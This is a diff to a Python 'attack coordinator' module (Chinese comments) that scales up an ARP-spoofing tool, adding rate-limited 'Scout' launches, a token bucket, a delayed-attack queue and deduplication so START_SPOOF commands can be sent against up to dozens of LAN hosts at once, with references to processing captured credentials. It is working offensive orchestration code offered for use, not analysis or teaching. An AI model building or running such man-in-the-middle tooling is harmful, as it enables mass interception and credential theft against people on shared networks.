@@ -1,12 +1,21 @@
 """
-攻击协调器
-==========
+攻击协调器 v2.0 - 高性能并发控制版
+=====================================
 根据数据包分析结果制定攻击策略，管理攻击生命周期
+新增功能：
+- 令牌桶限流机制
+- Scout错峰启动
+- 重复事件去重
+- ARM平台优化
 """
 
 import logging
 import time
 import threading
+import random
+import hashlib
+import platform
+from collections import deque
 from dataclasses import dataclass
 from typing import Optional, Callable, Dict, Any, Set
 from state_cache import StateCache
@@ -23,8 +32,167 @@ class AttackDecision:
     attack_type: str = "standard"  # 攻击类型
     reason: str = ""  # 决策原因
 
+class ConcurrencyController:
+    """并发控制器 - 令牌桶算法"""
+    
+    def __init__(self, max_concurrent=20, refill_rate=5):
+        self.max_concurrent = max_concurrent  # 最大并发数
+        self.refill_rate = refill_rate        # 每秒补充令牌数
+        self.tokens = max_concurrent          # 当前令牌数
+        self.last_refill = time.time()
+        self.lock = threading.Lock()
+        
+    def acquire_token(self) -> bool:
+        """获取令牌（非阻塞）"""
+        with self.lock:
+            self._refill_tokens()
+            if self.tokens > 0:
+                self.tokens -= 1
+                return True
+            return False
+    
+    def release_token(self):
+        """释放令牌"""
+        with self.lock:
+            self.tokens = min(self.max_concurrent, self.tokens + 1)
+    
+    def _refill_tokens(self):
+        """补充令牌"""
+        now = time.time()
+        elapsed = now - self.last_refill
+        tokens_to_add = int(elapsed * self.refill_rate)
+        
+        if tokens_to_add > 0:
+            self.tokens = min(self.max_concurrent, self.tokens + tokens_to_add)
+            self.last_refill = now
+    
+    def get_status(self) -> dict:
+        """获取状态信息"""
+        with self.lock:
+            return {
+                'tokens': self.tokens,
+                'max_concurrent': self.max_concurrent,
+                'refill_rate': self.refill_rate
+            }
+
+class ScoutLauncher:
+    """Scout任务启动器 - 错峰 + 限流"""
+    
+    def __init__(self, max_concurrent=50, launch_rate=8, logger=None):
+        self.max_concurrent = max_concurrent  # 最大Scout数量
+        self.launch_rate = launch_rate        # 每秒启动Scout数
+        self.logger = logger or logging.getLogger(__name__)
+        
+        # 令牌桶控制
+        self.semaphore = threading.Semaphore(max_concurrent)
+        self.launch_queue = deque()
+        self.active_scouts = set()
+        self.lock = threading.Lock()
+        
+        # 启动发射器线程
+        self.launcher_running = True
+        self.launcher_thread = threading.Thread(
+            target=self._launch_loop, daemon=True, name="ScoutLauncher"
+        )
+        self.launcher_thread.start()
+        self.command_sender = None
+        
+    def set_command_sender(self, sender):
+        """设置命令发送器"""
+        self.command_sender = sender
+    
+    def schedule_scout(self, target_ip, gateway_ip="10.17.0.1") -> bool:
+        """调度一个Scout任务"""
+        with self.lock:
+            if target_ip not in self.active_scouts and len(self.active_scouts) < self.max_concurrent:
+                # 添加随机延迟（10-100ms错峰）
+                delay = random.uniform(0.01, 0.1)
+                launch_time = time.time() + delay
+                
+                self.launch_queue.append({
+                    'target_ip': target_ip,
+                    'gateway_ip': gateway_ip,
+                    'launch_time': launch_time
+                })
+                return True
+        return False
+    
+    def _launch_loop(self):
+        """Scout发射循环"""
+        while self.launcher_running:
+            try:
+                current_time = time.time()
+                launch_interval = 1.0 / self.launch_rate  # 每隔125ms启动一个
+                
+                # 检查是否有到期的Scout任务
+                while (self.launch_queue and 
+                       self.launch_queue[0]['launch_time'] <= current_time):
+                    
+                    scout_task = self.launch_queue.popleft()
+                    
+                    if self.semaphore.acquire(blocking=False):  # 非阻塞获取信号量
+                        self._launch_scout_immediate(scout_task)
+                        time.sleep(launch_interval)  # 限制发射速率
+                    else:
+                        # 信号量满了，重新排队
+                        scout_task['launch_time'] = current_time + 1.0
+                        self.launch_queue.append(scout_task)
+                        break
+                
+                time.sleep(0.05)  # 50ms检查间隔
+                
+            except Exception as e:
+                self.logger.error(f"Scout launcher error: {e}")
+                time.sleep(0.1)
+    
+    def _launch_scout_immediate(self, scout_task):
+        """立即启动Scout"""
+        try:
+            target_ip = scout_task['target_ip']
+            
+            with self.lock:
+                self.active_scouts.add(target_ip)
+            
+            # 构造Scout命令
+            command = {
+                "type": "START_SPOOF",
+                "target_ip": target_ip,
+                "gateway_ip": scout_task['gateway_ip'],
+                "attack_type": "scouting",
+                "duration": 60
+            }
+            
+            # 发送给队列处理
+            if self.command_sender:
+                self.command_sender(command)
+                self.logger.info(f"🚀 Scout launched for {target_ip} (Active: {len(self.active_scouts)}/{self.max_concurrent})")
+            
+            # 60秒后释放信号量
+            threading.Timer(60.0, self._release_scout, args=[target_ip]).start()
+            
+        except Exception as e:
+            self.logger.error(f"Error launching scout: {e}")
+            self.semaphore.release()
+    
+    def _release_scout(self, target_ip):
+        """释放Scout资源"""
+        with self.lock:
+            self.active_scouts.discard(target_ip)
+        self.semaphore.release()
+        self.logger.debug(f"🏁 Scout released for {target_ip}")
+    
+    def get_status(self) -> dict:
+        """获取状态信息"""
+        with self.lock:
+            return {
+                'active_count': len(self.active_scouts),
+                'max_concurrent': self.max_concurrent,
+                'queue_count': len(self.launch_queue),
+                'launch_rate': self.launch_rate
+            }
+
 class AttackCoordinator:
-    """攻击协调器"""
+    """攻击协调器 v2.0 - 高性能并发控制版"""
     
     def __init__(self, config, state_cache: StateCache):
         self.config = config
@@ -32,22 +200,63 @@ class AttackCoordinator:
         self.logger = logging.getLogger(__name__)
         self.command_sender = None
         
-        # ★【关键修复】★ Scout和Attack分离的并发限制
-        self.max_scout_attacks = getattr(config, 'max_scout_attacks', 100)      # Scout侦察最大并发数
-        self.max_active_attacks = getattr(config, 'max_active_attacks', 40)     # Attack攻击最大并发数
-        # 保持向后兼容
-        self.max_concurrent_attacks = getattr(config, 'max_concurrent_attacks', 40)
+        # ★【ARM优化】★ 检测平台并调整参数
+        self.is_arm_platform = platform.machine().startswith(('arm', 'aarch'))
+        if self.is_arm_platform:
+            # ARM平台保守配置
+            scout_max = 30
+            scout_rate = 4
+            attack_max = 15
+            self.logger.info("🔧 ARM platform detected, using conservative settings")
+        else:
+            # x86平台正常配置
+            scout_max = 50
+            scout_rate = 8
+            attack_max = 25
+        
+        # ★【方案一】★ 并发控制器 - 令牌桶限流
+        self.concurrency_controller = ConcurrencyController(
+            max_concurrent=attack_max,
+            refill_rate=scout_rate // 2  # 攻击启动速率为Scout的一半
+        )
+        
+        # ★【方案二】★ Scout发射器 - 错峰启动
+        self.scout_launcher = ScoutLauncher(
+            max_concurrent=scout_max,
+            launch_rate=scout_rate,
+            logger=self.logger
+        )
+        
+        # ★【方案三】★ 重复事件去重缓存
+        self.processing_targets = {}  # TTL cache替代
+        self.processing_lock = threading.Lock()
+        self.processing_ttl = 5  # 5秒TTL
+        
+        # 命令去重缓存
+        self.command_fingerprints = {}
+        self.command_lock = threading.Lock()
+        self.command_ttl = 3  # 3秒TTL
+        
+        # ★【延迟队列】★ 用于缓存暂时无法执行的攻击
+        self.delayed_attacks = deque()
+        self.delay_processor_thread = None
+        self.delay_processor_running = False
+        
+        # ★【关键修复】★ Scout和Attack分离的并发限制（保持兼容性）
+        self.max_scout_attacks = scout_max
+        self.max_active_attacks = attack_max
+        self.max_concurrent_attacks = attack_max  # 向后兼容
         
         # ★【分离管理】★ 独立跟踪Scout和Attack会话
         self.active_scouts_lock = threading.Lock()
         self.active_attacks_lock = threading.Lock()
-        self.active_scouts: Set[str] = set()        # 当前活跃的Scout侦察目标
-        self.active_attacks: Set[str] = set()       # 当前活跃的Attack攻击目标
+        self.active_scouts: Set[str] = set()
+        self.active_attacks: Set[str] = set()
         
         # ★【强化去重】★ 全局凭据处理去重锁和缓存
-        self._global_credentials_lock = threading.RLock()  # 可重入锁
-        self._processing_credentials: Set[str] = set()  # 正在处理的凭据集合
-        self._processed_credentials: Set[str] = set()   # 已处理的凭据集合
+        self._global_credentials_lock = threading.RLock()
+        self._processing_credentials: Set[str] = set()
+        self._processed_credentials: Set[str] = set()
         self._last_cleanup = time.time()  # 上次清理时间
         
         # ★【新增】★ ARP 恢复去重
@@ -74,14 +283,60 @@ class AttackCoordinator:
         self.stats_lock = threading.Lock()
         
     def initialize(self, command_sender: Callable) -> bool:
-        """初始化协调器"""
+        """初始化协调器 v2.0"""
         self.command_sender = command_sender
-        self.logger.info("Attack coordinator initialized")
+        
+        # ★【新增】★ 设置Scout发射器的命令发送器
+        self.scout_launcher.set_command_sender(command_sender)
+        
+        # ★【新增】★ 启动延迟攻击处理线程
+        self._start_delay_processor()
         
         # ★【新增】★ 启动定期清理线程
         self._start_cleanup_thread()
         
+        self.logger.info("🚀 Attack Coordinator v2.0 initialized with enhanced concurrency control")
         return True
+
+    def _start_delay_processor(self):
+        """启动延迟攻击处理线程"""
+        self.delay_processor_running = True
+        self.delay_processor_thread = threading.Thread(
+            target=self._delay_processor_loop,
+            daemon=True,
+            name="DelayProcessor"
+        )
+        self.delay_processor_thread.start()
+        self.logger.info("🕒 Delay processor started")
+
+    def _delay_processor_loop(self):
+        """延迟攻击处理循环"""
+        while self.delay_processor_running:
+            try:
+                if self.delayed_attacks and self.concurrency_controller.acquire_token():
+                    delayed_decision = self.delayed_attacks.popleft()
+                    
+                    # 发送延迟的攻击命令
+                    if self.command_sender:
+                        command = self._decision_to_command(delayed_decision)
+                        self.command_sender(command)
+                        self.logger.info(f"🚀 Delayed attack launched for {delayed_decision.target_ip}")
+                
+                time.sleep(0.2)  # 每200ms检查一次
+                
+            except Exception as e:
+                self.logger.error(f"Error in delay processor: {e}")
+                time.sleep(1)
+
+    def _decision_to_command(self, decision) -> dict:
+        """将决策转换为命令"""
+        return {
+            "type": "START_SPOOF",
+            "target_ip": decision.target_ip,
+            "gateway_ip": decision.gateway_ip,
+            "attack_type": decision.attack_type,
+            "duration": decision.duration
+        }
     
     def _start_cleanup_thread(self):
         """启动定期清理线程，防止内存泄漏"""
@@ -134,43 +389,119 @@ class AttackCoordinator:
         return True
         
     def make_decision(self, analysis_result) -> Optional[AttackDecision]:
-        """根据分析结果制定攻击决策 - 强化去重版本"""
-        # ★【新增】★ 构建决策键，避免重复决策
-        target_ip = analysis_result.source_ip
-        decision_key = f"{analysis_result.packet_type}:{target_ip}"
-        
-        # ★【决策级去重】★ 检查是否已有线程在处理相同的决策
-        with self._decision_lock:
-            if decision_key in self._processing_decisions:
-                with self.stats_lock:
-                    self.stats['decisions_deduplicated'] += 1
-                self.logger.debug(f"🚫 Decision for {decision_key} already in progress, skipping")
-                return None
-            
-            # 标记为正在处理
-            self._processing_decisions.add(decision_key)
-        
+        """根据分析结果制定攻击决策 v2.0 - 高性能并发控制版"""
         try:
-            with self.stats_lock:
-                self.stats['decisions_made'] += 1
-                
-            # 执行实际决策逻辑
-            if analysis_result.packet_type == 'arp':
-                result = self._handle_arp_analysis(analysis_result)
-            elif analysis_result.packet_type == 'http':
-                result = self._handle_http_analysis(analysis_result)
-            else:
-                result = None
+            target_ip = analysis_result.src_ip if hasattr(analysis_result, 'src_ip') else analysis_result.source_ip
             
-            return result
+            # ★【方案三】★ 检查是否正在处理中（防止多线程重复提交）
+            if not self._check_and_mark_processing(target_ip):
+                return None  # 已在处理，忽略
+            
+            try:
+                # 检查是否需要攻击
+                if not self._should_attack(target_ip, analysis_result):
+                    return None
+                
+                # ★【方案二】★ 使用Scout发射器进行错峰启动
+                gateway_ip = getattr(analysis_result, 'gateway_ip', None) or "10.17.0.1"
+                if self.scout_launcher.schedule_scout(target_ip, gateway_ip):
+                    self.logger.info(f"🎫 Scout scheduled for {target_ip}")
+                    with self.stats_lock:
+                        self.stats['scouts_authorized'] += 1
+                    return None  # Scout发射器会异步处理
+                else:
+                    self.logger.debug(f"Scout queue full, trying direct attack for {target_ip}")
+                    
+                    # Scout队列满了，尝试直接攻击（如果有令牌）
+                    if self.concurrency_controller.acquire_token():
+                        decision = AttackDecision(
+                            action="attack",
+                            target_ip=target_ip,
+                            gateway_ip=gateway_ip,
+                            attack_type="direct",
+                            duration=60
+                        )
+                        self.logger.info(f"🎯 Direct attack authorized for {target_ip}")
+                        with self.stats_lock:
+                            self.stats['attacks_authorized'] += 1
+                        return decision
+                    else:
+                        # 无令牌时加入延迟队列
+                        delayed_decision = AttackDecision(
+                            action="attack",
+                            target_ip=target_ip,
+                            gateway_ip=gateway_ip,
+                            attack_type="delayed",
+                            duration=60
+                        )
+                        self.delayed_attacks.append(delayed_decision)
+                        self.logger.info(f"🎫 Token limit reached, queued {target_ip} for delayed execution")
+                        with self.stats_lock:
+                            self.stats['attacks_blocked'] += 1
+                        return None
+                        
+            finally:
+                # 处理完成，移除标记
+                self._unmark_processing(target_ip)
                 
         except Exception as e:
-            self.logger.error(f"Decision making error: {e}")
+            self.logger.error(f"Error in make_decision: {e}")
             return None
-        finally:
-            # ★【重要】★ 无论成功失败都要移除决策标记
-            with self._decision_lock:
-                self._processing_decisions.discard(decision_key)
+
+    def _check_and_mark_processing(self, target_ip: str) -> bool:
+        """检查并标记目标为处理中"""
+        current_time = time.time()
+        
+        with self.processing_lock:
+            # 清理过期条目
+            expired_keys = [k for k, v in self.processing_targets.items() 
+                          if current_time - v > self.processing_ttl]
+            for key in expired_keys:
+                del self.processing_targets[key]
+            
+            if target_ip in self.processing_targets:
+                return False  # 已在处理
+            
+            # 标记为处理中
+            self.processing_targets[target_ip] = current_time
+            return True
+
+    def _unmark_processing(self, target_ip: str):
+        """移除处理标记"""
+        with self.processing_lock:
+            self.processing_targets.pop(target_ip, None)
+
+    def _generate_command_fingerprint(self, command: dict) -> str:
+        """生成命令指纹用于去重"""
+        key_fields = [
+            command.get('type', ''),
+            command.get('target_ip', ''),
+            command.get('attack_type', '')
+        ]
+        return hashlib.md5('|'.join(key_fields).encode()).hexdigest()
+
+    def send_command_with_dedup(self, command: dict) -> bool:
+        """发送命令前进行去重检查"""
+        fingerprint = self._generate_command_fingerprint(command)
+        current_time = time.time()
+        
+        with self.command_lock:
+            # 清理过期指纹
+            expired_keys = [k for k, v in self.command_fingerprints.items() 
+                          if current_time - v > self.command_ttl]
+            for key in expired_keys:
+                del self.command_fingerprints[key]
+            
+            if fingerprint in self.command_fingerprints:
+                self.logger.debug(f"Duplicate command filtered: {command['type']} -> {command.get('target_ip')}")
+                return False
+            
+            self.command_fingerprints[fingerprint] = current_time
+        
+        # 发送到队列
+        if self.command_sender:
+            self.command_sender(command)
+        return True
     
     def _handle_arp_analysis(self, analysis) -> Optional[AttackDecision]:
         """处理ARP分析结果 - 发起侦察窗口 (Scout模式)"""
@@ -711,3 +1042,73 @@ class AttackCoordinator:
             
             import threading
             threading.Thread(target=cleanup_restore_mark, daemon=True).start()
+
+    # ★【新增】★ 增强的状态统计方法
+    def get_session_stats(self) -> dict:
+        """获取会话统计信息 - 增强版"""
+        with self.active_scouts_lock:
+            active_scouts = len(self.active_scouts)
+        with self.active_attacks_lock:
+            active_attacks = len(self.active_attacks)
+        
+        scout_utilization = (active_scouts / self.max_scout_attacks) * 100 if self.max_scout_attacks > 0 else 0
+        attack_utilization = (active_attacks / self.max_active_attacks) * 100 if self.max_active_attacks > 0 else 0
+        
+        return {
+            'active_scouts': active_scouts,
+            'max_scout_attacks': self.max_scout_attacks,
+            'scout_utilization': scout_utilization,
+            'active_attacks': active_attacks,
+            'max_active_attacks': self.max_active_attacks,
+            'attack_utilization': attack_utilization,
+            'delayed_attacks': len(self.delayed_attacks)
+        }
+    
+    def get_concurrency_stats(self) -> dict:
+        """获取并发控制统计信息"""
+        # 令牌桶状态
+        token_status = self.concurrency_controller.get_status()
+        
+        # Scout发射器状态
+        scout_status = self.scout_launcher.get_status()
+        
+        # 处理中的目标数量
+        with self.processing_lock:
+            processing_targets = len(self.processing_targets)
+        
+        # 命令去重缓存大小
+        with self.command_lock:
+            command_cache_size = len(self.command_fingerprints)
+        
+        return {
+            'tokens_available': token_status['tokens'],
+            'max_tokens': token_status['max_concurrent'],
+            'token_refill_rate': token_status['refill_rate'],
+            'scout_active': scout_status['active_count'],
+            'scout_queue': scout_status['queue_count'],
+            'scout_launch_rate': scout_status['launch_rate'],
+            'processing_targets': processing_targets,
+            'command_cache_size': command_cache_size,
+            'delayed_attacks': len(self.delayed_attacks)
+        }
+
+    def _should_attack(self, target_ip: str, analysis_result) -> bool:
+        """判断是否应该攻击目标 - 简化版本"""
+        # 基本检查
+        if not target_ip or target_ip == "0.0.0.0":
+            return False
+        
+        # 检查是否在白名单
+        if hasattr(self.config, 'whitelist') and target_ip in self.config.whitelist:
+            return False
+        
+        # 检查是否已经在攻击
+        with self.active_scouts_lock:
+            if target_ip in self.active_scouts:
+                return False
+        
+        with self.active_attacks_lock:
+            if target_ip in self.active_attacks:
+                return False
+        
+        return True
